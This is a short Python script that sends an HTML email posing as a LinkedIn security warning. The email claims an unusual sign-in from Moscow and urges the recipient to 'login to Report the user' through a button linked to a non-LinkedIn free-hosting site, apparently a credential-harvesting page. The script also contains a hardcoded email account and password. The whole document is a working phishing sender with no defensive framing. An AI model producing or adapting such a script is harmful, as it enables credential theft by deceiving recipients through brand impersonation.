import smtplib
from email.message import EmailMessage

EMAIL_ADDRESS = 'checkdetails67'
EMAIL_PASSWORD = 'Gg124578'

msg = EmailMessage()
msg['Subject'] = 'linkedIn WARNING - report unusual activity! '
msg['From'] = EMAIL_ADDRESS
msg['To'] = 'cc067644@gmail.com'

msg.set_content('This is a plain text email')

msg.add_alternative("""\
<!DOCTYPE html>
<html>
    <head>
        <style>
            .button {
              border: none;
              color: white;
              padding: 10px 25px;
              text-align: center;
              text-decoration: none;
              display: inline-block;
              font-size: 16px;
              margin: 4px 2px;
              cursor: pointer;
            }
            
            .button2 {background-color: #008CBA;} /* Blue */
            </style>
    </head>
    <body>
        <img src="https://1000logos.net/wp-content/uploads/2017/03/Linkedin-Logo-500x281.png" width="200px" height="100px">

        <div style=" background-color: #EBEBEB; width: 60%;">
            <p>We detected something unusual about a recent sign-in to your LinkedIn account<br><br>

                Sign-in details<br>
                
                Country/region: Russia/Moscow<br>
                
                IP address:<br>
                
                Date: Sat, 10 May 2022 02:31:23 +0100<br>
                
                Platform: Kali Linux<br>
                
                Browser: Firefox<br>
                
                A user from Russia/Moscow just logged into your account from a new device, If this wasn’t you, please report the user. If this was you, we’ll trust similar activity in the future.<br><br>
                
                please login to Report the user and change your password<br>
                <div>
                    <button type="button" class="button button2"><a href="https://mississippian-weldi.000webhostapp.com/" style="color:white;">Login</a></button>
                </div>
                
                <div style="font:bold;">
                Thanks,<br>
                
                <br>The LinkedIn account team</p>
                </div>
        </div>
    </body>
</html>
""", subtype='html')


with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
    try:
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)
    except:
        print("login fail")
